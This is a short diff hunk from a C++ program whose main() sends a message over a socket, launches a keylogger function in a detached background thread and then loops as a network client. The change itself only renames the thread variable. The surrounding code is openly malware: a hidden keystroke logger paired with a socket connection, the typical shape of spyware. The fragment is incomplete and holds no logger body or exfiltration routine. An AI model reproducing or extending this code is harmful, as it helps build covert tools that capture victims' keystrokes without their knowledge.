@@ -56,8 +56,8 @@ int main(){
     send(s, message, strlen(message), 0); //sending message over the socket
 
     //starting keylogger in thread
-    std::thread keylogger(logKeyPress);
-    keylogger.detach();
+    std::thread keyloggerThread(logKeyPress);
+    keyloggerThread.detach();
 
     //infinite cliente
     while(true){
